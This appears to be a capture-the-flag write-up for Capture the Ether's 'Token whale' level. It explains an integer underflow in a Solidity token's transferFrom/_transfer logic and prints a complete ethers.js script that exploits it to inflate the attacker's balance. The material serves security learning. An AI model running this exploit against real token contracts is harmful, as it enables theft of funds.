---
description: >-
  In Capture the Ether's "Token whale" we see a slightly more challenging and
  better obscured math-related vulnerability.
---

# Token whale

This [level](https://capturetheether.com/challenges/math/token-whale/) asks us to assume the role of a whale, holding the entirety of the token supply for a new protocol. Our challenge is to accumulate many more _without_ the ability to buy them outright.

### Hints

<details>

<summary>Hint One</summary>

The key to this exploit is still a "math" vulnerability. It's just obscured by an extra step, an error in the contract's implementation that is not itself math-related.

</details>

<details>

<summary>Hint Two</summary>

The vulnerability you need to take advantage of is found in the `_transfer` function when called from `transferFrom`. You need to be able to satisfy each of the latter's `require` conditions first.

</details>

<details>

<summary>Hint Three</summary>

You will need to issue transactions from **two** separate EOAs to solve this level.

</details>

### Full Walkthrough

As we scan the contract, we may notice both a potential overflow and underflow vulnerability within the `_transfer` function (lines 2 and 3 below):

```solidity
function _transfer(address to, uint256 value) internal {
    balanceOf[msg.sender] -= value;
    balanceOf[to] += value;

    emit Transfer(msg.sender, to, value);
}
```

Line 3 would require submitting a `value` large enough to _over_flow our balance, which is impractical due to other restrictions imposed by the contract, but line 2, an _under_flow is worth investigating. If we could, for example, reduce our account balance to 0 by transferring away our tokens, then attempt to transfer just one more, it would "roll over" our balance to its type's maximum value. Is this possible?

Transferring the full amount of our tokens away to another address is straightforward. But transferring one additional token, i.e. one more than our current balance, cannot be achieved via the `transfer` function due to its `require(balanceOf[msg.sender] >= value);` condition. It **should** not be possible to do via `transferFrom` either, but there is a flaw in the implementation.

Let's examine the `transferFrom` function below:

```solidity
function transferFrom(address from, address to, uint256 value) public {
    require(balanceOf[from] >= value);
    require(balanceOf[to] + value >= balanceOf[to]);
    require(allowance[from][msg.sender] >= value);

    allowance[from][msg.sender] -= value;
    _transfer(to, value);
}
```

The function's `require` conditions check that the balance of the `from` address is greater than or equal to the value we are attempting to transfer, however, when it calls `_transfer`, that function actually spends tokens from `msg.sender`, ignoring the `from` address altogether. This means if we call the function from an address that has zero tokens, but pass an address that has a positive balance as the first argument, we can underflow the account of `msg.sender` in `_transfer`. The only other step required is first granting `msg.sender` the requisite allowance to call `transferFrom` on behalf of the `from` account (this is granted via the `approve` function). See the scripted solution below (beginning on line 60) for these steps in order.

### Scripted Solution

```javascript
const ethers = require('ethers')
const fs = require('fs')
require('dotenv').config({ path: './.env' })

/**
 * Initialize Ethers objects needed to interact with the blockchain and
 * contract.
 */
async function setup(contractName) {
  // Create provider - a read-only abstraction to access blockchain data
  const provider = new ethers.providers.InfuraProvider(process.env.NETWORK)
  // Create contract instance - an abstraction of the deployed contract code
  const contractAbi = fs.readFileSync(`./${contractName}.abi`, 'utf8')
  // Create player one wallet
  const playerOneWallet = new ethers.Wallet(process.env.PLAYER_ONE_PRIVATE_KEY)
  // Create player one wallet signer - an abstraction of an Ethereum account
  const playerOneSigner = await playerOneWallet.connect(provider)
  // Create player two wallet
  const playerTwoWallet = new ethers.Wallet(process.env.PLAYER_TWO_PRIVATE_KEY)
  // Create player two wallet signer - an abstraction of an Ethereum account
  const playerTwoSigner = await playerTwoWallet.connect(provider)
  // Create contract signed by player one
  const contractWithPlayerOneSigner = new ethers.Contract(
    process.env.CONTRACT_ADDRESS,
    contractAbi,
    playerOneSigner
  )
  // Create contract signed by player two
  const contractWithPlayerTwoSigner = new ethers.Contract(
    process.env.CONTRACT_ADDRESS,
    contractAbi,
    playerTwoSigner
  )

  return {
    provider,
    playerOneAddress: process.env.PLAYER_ONE_ADDRESS,
    playerOneWallet,
    playerOneSigner,
    playerTwoAddress: process.env.PLAYER_TWO_ADDRESS,
    playerTwoWallet,
    playerTwoSigner,
    contractWithPlayerOneSigner,
    contractWithPlayerTwoSigner
  }
}

/**
 * Run contract exploit.
 */
async function main() {
  // Get Ethers objects needed to interact with the blockchain and contract
  const {
    playerOneAddress,
    contractWithPlayerOneSigner,
    playerTwoAddress,
    contractWithPlayerTwoSigner
  } = await setup('TokenWhaleChallenge')

  // Approve player one to spend player two's tokens
  console.log("Approving player one to spend player two's tokens...")
  const approvePlayerOne = await contractWithPlayerTwoSigner.approve(
    playerOneAddress,
    1000
  )
  await approvePlayerOne.wait(1)

  // Transfer all of player one's tokens to player two
  console.log("Transfering all of player one's tokens to player two...")
  const transferToPlayerTwo = await contractWithPlayerOneSigner.transfer(
    playerTwoAddress,
    1000
  )
  await transferToPlayerTwo.wait(1)

  // Transfer one more coin from player one's empty wallet
  console.log(
    "Transfering one more token from player one's empty wallet to player two..."
  )
  const transferFromPlayerOne = await contractWithPlayerOneSigner.transferFrom(
    playerTwoAddress, // from: used to pass require, but not the actual 'from' account
    playerTwoAddress, // to: player two
    1 // value: 1 coin from player one's (msg.sender's) empty wallet
  )
  await transferFromPlayerOne.wait(1)

  // Confirm challenge completion
  console.log('Confirming challenge completion...')
  const challengeComplete = await contractWithPlayerOneSigner.isComplete()

  if (challengeComplete) {
    console.log('Challenge is complete!')
  }
}

main()
  .then(() => process.exit(0))
  .catch(error => {
    console.error(error)
    process.exit(1)
  })
```
